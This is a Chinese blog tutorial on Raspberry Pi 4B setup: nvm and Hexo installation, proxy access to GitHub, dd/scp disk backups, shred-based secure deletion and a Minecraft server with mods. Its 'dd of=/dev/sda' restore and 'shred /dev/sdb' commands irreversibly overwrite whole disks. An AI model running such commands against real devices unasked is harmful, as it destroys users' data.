<h2 id="入门-x2F-萌新篇"><a href="#入门-x2F-萌新篇" class="headerlink" title="入门&#x2F;萌新篇"></a>入门&#x2F;萌新篇</h2><h3 id="安装树莓派基地系统"><a href="#安装树莓派基地系统" class="headerlink" title="安装树莓派基地系统"></a>安装树莓派基地系统</h3><p><strong>买回来一块树莓派4b裸板，首先得给它刷上系统。那么选<a href="https://www.raspberrypi.com/software/">官方的树莓派</a>系统呢？还是选一个干净的<a href="https://cn.ubuntu.com/download/raspberry-pi">ubuntu系统</a>呢？嘿嘿，我们都不选，我们使用树莓派爱好者基地编译好的树莓派基地系统。里面集成了各种功能强大的图像化面板。</strong></p>
<h3 id="优化-x2F-关闭多余服务"><a href="#优化-x2F-关闭多余服务" class="headerlink" title="优化&#x2F;关闭多余服务"></a>优化&#x2F;关闭多余服务</h3><h3 id="安装宝塔服务"><a href="#安装宝塔服务" class="headerlink" title="安装宝塔服务"></a>安装宝塔服务</h3><p><a href="https://www.bt.cn/new/download.html">宝塔面板下载，免费全能的服务器运维软件 (bt.cn)</a></p>
<h2 id="进阶-x2F-折腾篇"><a href="#进阶-x2F-折腾篇" class="headerlink" title="进阶&#x2F;折腾篇"></a>进阶&#x2F;折腾篇</h2><h3 id="raspberry安装-hexo博客"><a href="#raspberry安装-hexo博客" class="headerlink" title="raspberry安装 hexo博客"></a>raspberry安装 hexo博客</h3><p><strong>学习raspberry是少不了折腾的，每一次的折腾都能积累不少经验，这些失败的记忆和折腾的历程会伴随时间慢慢淡去，一个博客能够记下你的学习历程以及知识的积累。那么，入门的萌新都不舍得花钱买服务器,公网ip,域名等等。那么，我们现在开始搭建的博客，可以在有“免费的x级域名”的github下用“免费的仓库”来搭建我们“宝贵的知识宝库”。</strong></p>
<p><strong>首先我们安装nvm</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/nvm-sh/nvm/archive/refs/tags/v0.39.1.tar.gz</span><br></pre></td></tr></table></figure>

<p><strong>然后解压</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xzvf v0.39.1.tar.gz</span><br></pre></td></tr></table></figure>

<p><strong>进入解压目录中</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nvm-0.39.1/</span><br></pre></td></tr></table></figure>

<p><strong>安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure>

<p><strong>执行完成后会弹出这样的信息</strong></p>
<p><strong>export NVM_DIR&#x3D;”$HOME&#x2F;.nvm”</strong><br><strong>[ -s “$NVM_DIR&#x2F;nvm.sh” ] &amp;&amp; . “$NVM_DIR&#x2F;nvm.sh”  # This loads nvm</strong><br><strong>[ -s “$NVM_DIR&#x2F;bash_completion” ] &amp;&amp; . “$NVM_DIR&#x2F;bash_completion”  # This loads nvm bash_completion</strong></p>
<p><strong>然后在终端粘贴这个命令配置环境</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/.nvm&quot;</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="comment"># This loads nvm</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/bash_completion&quot;</span> ] &amp;&amp; \. <span class="string">&quot;<span class="variable">$NVM_DIR</span>/bash_completion&quot;</span>  <span class="comment"># This loads nvm bash_completion</span></span><br></pre></td></tr></table></figure>

<p><strong>检测nvm是否安装成功</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvm --version</span><br></pre></td></tr></table></figure>

<p><strong>查看已经安装的版本</strong></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nvm list</span></span><br></pre></td></tr></table></figure>

<p>查看可安装版本</p>
<p><strong>如何查看通过NVM安装的Node.js版本呢？</strong><br><strong>你可以直接使用NVM命令：</strong></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta"># raspberry</span></span><br><span class="line">nvm list available</span><br></pre></td></tr></table></figure>

<p><strong>安装Node.js</strong></p>
<p><strong>我们安装16.15.1版本node.js：</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nvm</span> install <span class="number">16</span>.<span class="number">15</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>激活Node.js版本</strong></p>
<p><strong>我们安装好Node.js以后，需要激活它</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nvm</span> use <span class="number">16</span>.<span class="number">15</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>换腾讯的源</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry http://mirrors.cloud.tencent.com/npm/</span><br></pre></td></tr></table></figure>

<p><strong>安装Git</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure>

<p><strong>安装hexo博客软件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p><strong>创建博客orange目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> orange</span><br></pre></td></tr></table></figure>

<p><strong>初始化博客目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> orange </span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p><strong>启动博客服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在orange目录里面，执行后去4000端口查看博客生成</span></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20220830135622620.png" alt="image-20220830135622620"></p>
<h3 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h3><h4 id="临时获得访问GitHub"><a href="#临时获得访问GitHub" class="headerlink" title="临时获得访问GitHub"></a>临时获得访问GitHub</h4><p><strong>很多时候，我们使用终端去克隆下载GitHub的东西的时候，发现会被拒绝的现象出现，这个原因是我们国家的GFW在发挥着不可或缺的作用，那么Github在世界是有大量的CDN节点的，我们可以利用这个特性，让我们的终端临时性重新获得下载东西的能力。</strong></p>
<p><strong>首先，访问<a href="https://tool.lu/ip/">tool.lu</a>把域名的ip解析出来</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230125230205943.png" alt="image-20230125230205943"></p>
<p><strong>然后修改Linux系统的<code>/etc/hosts</code>文件</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230125230244687.png" alt="image-20230125230244687"></p>
<p><strong>那么终端就能临时性的访问Github的能力了。</strong></p>
<h4 id="终端代理访问GitHub"><a href="#终端代理访问GitHub" class="headerlink" title="终端代理访问GitHub"></a>终端代理访问GitHub</h4><p><strong>如果你们设计了本地代理软件的话，可以把局域网共享打开然后让树莓派也获得访问GitHub能力，这样终端下载国外的deb包速度也是很快的(因为我不习惯换国内源，国内源删太多东西了，有些资源包说没有的时候比下的慢更难受)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">proxy_on</span></span>() &#123;</span><br><span class="line">    <span class="built_in">export</span> http_proxy=http://your_ip:your_port</span><br><span class="line">    <span class="built_in">export</span> https_proxy=<span class="variable">$http_proxy</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;终端代理已开启。&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">proxy_off</span></span>()&#123;</span><br><span class="line">    <span class="built_in">unset</span> http_proxy https_proxy</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;终端代理已关闭。&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>弄好后，记得要<code>source  /etc/profile</code>让其临时生效，不然就要重启才能使用了</strong></p>
<p><strong>通过<code>proxy_on</code>启动代理，<code>proxy_off</code>关闭代理。</strong></p>
<p><strong>可以执行<code>curl cip.cc</code>验证：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># proxy_on</span></span><br><span class="line">终端代理已开启。</span><br><span class="line">root@raspbian:~<span class="comment"># curl cip.cc</span></span><br><span class="line">IP	: 3.113.4.154</span><br><span class="line">地址	: 美国  美国</span><br><span class="line"></span><br><span class="line">数据二	: 日本 | 东京Amazon数据中心</span><br><span class="line"></span><br><span class="line">数据三	: 美国华盛顿 | 亚马逊</span><br><span class="line"></span><br><span class="line">URL	: http://www.cip.cc/3.113.4.154</span><br></pre></td></tr></table></figure>

<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><h4 id="备份一个盘符"><a href="#备份一个盘符" class="headerlink" title="备份一个盘符"></a>备份一个盘符</h4><p><strong>首先，先确定盘符，然后开始备份</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> bs=4M <span class="keyword">if</span>=/dev/sda | gzip &gt; bask-raspberry.img.gz</span><br></pre></td></tr></table></figure>

<h4 id="解压至盘符"><a href="#解压至盘符" class="headerlink" title="解压至盘符"></a>解压至盘符</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip -<span class="built_in">cd</span> bask-raspberry.img.gz | <span class="built_in">dd</span> bs=4M of=/dev/sda</span><br></pre></td></tr></table></figure>

<h4 id="备份到远程服务器"><a href="#备份到远程服务器" class="headerlink" title="备份到远程服务器"></a>备份到远程服务器</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -p bask-raspberry.img.gz user@ip:path/</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>scp 和 rsync : scp是每次传都是重新重传独立的一份，rsync使用的是差分传输算法，只会传输发生了变化的那部分</strong></p>
</blockquote>
<h4 id="定时备份脚本"><a href="#定时备份脚本" class="headerlink" title="定时备份脚本"></a>定时备份脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">TODAY=$(<span class="built_in">date</span> + <span class="string">&quot;%F&quot;</span>)</span><br><span class="line"><span class="built_in">cd</span> /home/pi</span><br><span class="line">tar -czf mydocsbackup-<span class="string">&quot;<span class="variable">$TODAY</span>&quot;</span>.tgz Documents</span><br><span class="line">scp mydocsbackup-<span class="string">&quot;<span class="variable">$TODAY</span>&quot;</span>.tgz user@ip:path/bak/</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>这里需要双方互换ssh-key，不然需要验证密码，这样脚本就无法完成最后一步</strong></p>
</blockquote>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>学到这里了，那么我默认你已经是具有RHCSA（RHCSA是Red Hat Certified System Administrator的简称，属于红帽linux的初级入门认证）的实力。下面学到的命令，跟RHCSA学到的可以起到相辅相成的作用。</strong></p>
<h4 id="安全移除数据"><a href="#安全移除数据" class="headerlink" title="安全移除数据"></a>安全移除数据</h4><p><strong>别以为，你<code>rm -rf</code>就是删掉了数据，其实跟win一样都是只删掉了对应的<code>inode表项</code>，是可以通过修复底层数据的修复来还原整个文件系统，如果你需要安全清理某些敏感数据，可以试一下<code>shred</code>这是通过多次覆盖，下面是覆盖5次。（其实<code>dd</code>命令也是可以以比特为单位覆盖数据，<code>shred</code>能干多次而已）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shred</span> -v -n 5 a.txt</span><br><span class="line"><span class="built_in">shred</span> -v -n 5 /dev/sdb</span><br></pre></td></tr></table></figure>

<h3 id="我的世界"><a href="#我的世界" class="headerlink" title="我的世界"></a>我的世界</h3><h4 id="我的世界启动器安装"><a href="#我的世界启动器安装" class="headerlink" title="我的世界启动器安装"></a>我的世界启动器安装</h4><h5 id="HMCL"><a href="#HMCL" class="headerlink" title="HMCL"></a>HMCL</h5><p><strong>[HMCL](<a href="https://hmcl.huangyuhui.net/">Hello Minecraft! Launcher (huangyuhui.net)</a>)</strong></p>
<p><strong>下载好后点开安装即可</strong></p>
<h4 id="我的世界程序安装"><a href="#我的世界程序安装" class="headerlink" title="我的世界程序安装"></a>我的世界程序安装</h4><p><strong>想要我的世界服务跑起来，光有启动器是不行的，还得有我的世界程序。那么这个 程序可以跑在本地电脑（自己一个人游玩和局域网内和小伙伴们一起游玩），也可以跑在公网服务器上（自己游玩的同时，小伙伴们也不限制在局域网连机，小伙伴可以在各自的家里舒舒服服地躺着玩，也因为是公网服务器，世界各地的小伙伴也可以进来happy，只不过由于地域距离的问题，他们要顶着高ping和国人玩耍。正常来讲是我们顶着高ping去玩人家的服务器，网易服务器的尿性你们懂的！！！）</strong></p>
<h5 id="raspberry树莓派4b部署我的世界"><a href="#raspberry树莓派4b部署我的世界" class="headerlink" title="raspberry树莓派4b部署我的世界"></a>raspberry树莓派4b部署我的世界</h5><p><strong><code>pinecraft</code>里面已经支持到了<code>1.20.1</code>，旧版本的MC也可以通过之前发布的版本找到，本次以<code>1.16.5</code>作为安装教程。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230714173342531.png" alt="image-20230714173342531"></p>
<p><a href="https://github.com/Cat5TV/pinecraft">pinecraft</a></p>
<p><strong>下载安装程序：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  https://github.com/Cat5TV/pinecraft.git</span><br></pre></td></tr></table></figure>

<p><strong>进入下载程序目录：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> pinecraft/</span><br></pre></td></tr></table></figure>

<p><strong>安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./install</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230216185458839.png" alt="image-20230216185458839"></p>
<p><strong>敲下安装命令可以看到一个非常好看的安装界面，不要吐槽，这在linux算是貂蝉西施那样的尤物了。我们按下两下空格，等待安装包下载。。。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230216185626671.png" alt="image-20230216185626671"></p>
<p><strong>下面是安装路径和启动用户（pi），我们按下空格确认，这样我就知道程序运行在哪里，运行程序的用户是谁了。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230216185652951.png" alt="image-20230216185652951"></p>
<p><strong>选择种子。。。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217111118092.png" alt="image-20230217111118092"></p>
<p><strong>选择服务器是什么版本的我选择fabric的。。。因为我只会fabric，你们如果不会直接默认paper（人家优化好说不定。。。）</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217113335192.png" alt="image-20230217113335192"></p>
<p><strong>模式选择生存模式</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217111444649.png" alt="image-20230217111444649"></p>
<p><strong>同意一下协议</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217111500058.png" alt="image-20230217111500058"></p>
<p><strong>它想写点东西进你的boot</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217111533209.png" alt="image-20230217111533209"></p>
<p><strong>意思是。。。把你的树莓派超频到1.9Ghz，吃掉你的树莓派内存4398MB~5319MB，要记得你这我的世界的版本是1.16.5</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217113423508.png" alt="image-20230217113423508"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217112021350.png" alt="image-20230217112021350"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217113447754.png" alt="image-20230217113447754"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217113513324.png" alt="image-20230217113513324"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">htop</span><br></pre></td></tr></table></figure>

<p><strong>可以看出mc吃内存和占用cpu很高</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217113613574.png" alt="image-20230217113613574"></p>
<p>切换用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - pi</span><br></pre></td></tr></table></figure>

<p>进入目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> minecraft/</span><br></pre></td></tr></table></figure>

<p>编辑文件，允许非正版用户加入MC</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim server.properties</span><br></pre></td></tr></table></figure>

<p><strong>改成false</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217120355525.png" alt="image-20230217120355525"></p>
<p><strong>我们来看一下这个MC目录里面的结构</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217121055428.png" alt="image-20230217121055428"></p>
<p><strong>里面有个叫server的执行文件，我们可以修改里面给java赋予的内存，可以把最小值改到1G即（1024M）</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217121345778.png" alt="image-20230217121345778"></p>
<p><strong>我一般喜欢把能降低的都降低。。。尽量压缩使用内存留给更多后续服务</strong></p>
<p><strong>然后执行停止命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./stop</span><br></pre></td></tr></table></figure>

<p><strong>然后执行运行我的世界命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -R MC</span><br></pre></td></tr></table></figure>

<p><strong>然后</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./server</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217121804146.png" alt="image-20230217121804146"></p>
<p><strong>等待到100%就可以使用启动器进入我的世界了</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217121841038.png" alt="image-20230217121841038"></p>
<p><strong>我们按住<code>ctrl+a</code>然后<code>ctrl+d</code>就能把这个sscreen程序运行的mc服务常驻后台</strong></p>
<p><strong>我们再看看<code>htop</code>，先后对比</strong></p>
<p><strong>修改server之前</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217113613574.png" alt="image-20230217113613574"></p>
<p><strong>修改server之后</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217122052848.png" alt="image-20230217122052848"></p>
<p><strong>Mem内存的使用状况已经降低，我们可以为后续加mod留出更大的空间</strong></p>
<p><strong>查看服务器ip</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip add</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217123031830.png" alt="image-20230217123031830"></p>
<p><strong>由上面，可以知道我们MC服务器ip是内网地址192.168.0.107，那么我本机也是在内网的可以直接连接。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217123149553.png" alt="image-20230217123149553"></p>
<p><strong>启动器打开，进MC，左上角FPS达到惊人的98</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230217122542979.png" alt="image-20230217122542979"></p>
<h5 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a>启动器</h5><p><strong>我们刚刚安装好HMCL后，打开应该都是这个样子</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321145515476.png" alt="image-20230321145515476"></p>
<p><strong>我们首先登录账号，如果有微软正版账号也可以用正版登录，这里选择离线模式和微软账号都没有任何区别，这里用离线模式登录。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321145856307.png" alt="image-20230321145856307"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321145933639.png" alt="image-20230321145933639"></p>
<p><strong>然后，回到最初界面，可以看到有个用户了。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150044259.png" alt="image-20230321150044259"></p>
<p><strong>接下来，我们选择我的世界版本。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150123098.png" alt="image-20230321150123098"></p>
<p><strong>点击安装新游戏版本</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150153176.png" alt="image-20230321150153176"></p>
<p><strong>我们服务器安装的就是1.16.5fabric版本</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150303388.png" alt="image-20230321150303388"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150521647.png" alt="image-20230321150521647"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150550571.png" alt="image-20230321150550571"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150605561.png" alt="image-20230321150605561"></p>
<p><strong>我们还是遵循选新不选旧原则</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321150639242.png" alt="image-20230321150639242"></p>
<p><strong>本体+fabric+fabric API确认无误之后然后点击安装</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321151023930.png" alt="image-20230321151023930"></p>
<p><strong>点击安装，静待安装成功</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321151106422.png" alt="image-20230321151106422"></p>
<p><strong>安装成功，回到最初界面，发现图标变了。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321151213363.png" alt="image-20230321151213363"></p>
<p><strong>点击游戏开始玩原汁原味的MC 1.16.5吧！！！</strong></p>
<h5 id="加装光影"><a href="#加装光影" class="headerlink" title="加装光影"></a>加装光影</h5><p><strong>光影只会占本地端电脑的性能，不关linux服务器的事，所以光影只需放在本地即可</strong></p>
<p><strong>然后，在本地电脑端找到<code>.minecraft</code>–&gt;<code>shaderpacks</code>放入下载好的光影压缩包</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230328202947555.png" alt="image-20230328202947555"></p>
<p><strong>然后在游戏加载光影压缩包即可</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230321151636309.png" alt="image-20230321151636309"></p>
<h5 id="材质包"><a href="#材质包" class="headerlink" title="材质包"></a>材质包</h5><h5 id="加装mods"><a href="#加装mods" class="headerlink" title="加装mods"></a>加装mods</h5><p><strong>MOD它是一个英语的缩写，它的全称应该是modification，这个其实是修改的意思，不过中文给音译过来变成了“模组”，所以MOD其实就是游戏模组，作用就是对原本的游戏内容再加入一些新的东西，让我的世界这款游戏，更加的多样化。</strong></p>
<p><strong>这里有个要点，就是服务器加mod，本地不加mod是无法调用mod的。反之，本地加了mod，服务器没有加mod也是用不了的。必须要两端都加mod才能成功使用mod。</strong></p>
<p><strong>首先，在你linux服务器上面找到你mc的服务文件夹，然后<code>cd</code>进去，然后<code>ls</code>一下就能看到<code>mods</code>文件夹了</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230328201940861.png" alt="image-20230328201940861"></p>
<p><strong>在网上找到喜欢的mod，然后下载相对应版本的mod放进去mods文件夹中</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230328202239098.png" alt="image-20230328202239098"></p>
<p><strong>就是这样啦！什么模组菜单啦！一键整理啦！创世神啦！</strong></p>
<p><strong>然后，在本地电脑端也要找到<code>.minecraft</code>–&gt;<code>mods</code>放入和服务器端一样的<code>mod</code></strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230328202522867.png" alt="image-20230328202522867"></p>
<p><strong>打开游戏就会自动和服务器同步载入mod啦</strong></p>
<h5 id="MC调用独显帧率暴涨"><a href="#MC调用独显帧率暴涨" class="headerlink" title="MC调用独显帧率暴涨"></a>MC调用独显帧率暴涨</h5><p><strong>搭好MC会发现，进去玩的时候<code>50</code>多帧，下雨的时候直接掉到<code>40</code>多帧，这怎么办？</strong></p>
<p><strong>按<code>F3</code>可以看到这个图，左边的<code>52FPS</code>夜晚状态，中间的<code>GPU</code>占用<code>72%</code>，右边的<code>CPUI5-12450H</code>可以知道目前使用的是CPU的核显，那个性能懂得都懂。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230711235352153.png" alt="image-20230711235352153"></p>
<p>接下来教你们怎么驱动独显跑MC，帧率暴涨，首先打开<code>MC的启动器</code>，我的以<code>HMCL</code>作为演示。</p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230711235836145.png" alt="image-20230711235836145"></p>
<p>打开<code>HMCL</code>，然后点击<code>设置</code></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230711235920070.png" alt="image-20230711235920070"></p>
<p>记住这个<code>java路径</code></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000007798.png" alt="image-20230712000007798"></p>
<p><strong>点击电脑的开始菜单，找到设置按钮，并且点击进去</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000136395.png" alt="image-20230712000136395"></p>
<p><strong>找到游戏选项，点击进去</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000217306.png" alt="image-20230712000217306"></p>
<p><strong>在<code>Xbox Game Bar</code>找到右上角这个<code>图形设置</code>，并且点击进去</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000315575.png" alt="image-20230712000315575"></p>
<p><strong>打开里面的<code>硬件加速GPU计划</code>，再点击下方的浏览找到<code>Java</code>的路径</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000438716.png" alt="image-20230712000438716"></p>
<p><strong>把<code>java.exe</code>,<code>javac.exe</code>,<code>javaw.exe</code>这三个都加入进去</strong></p>
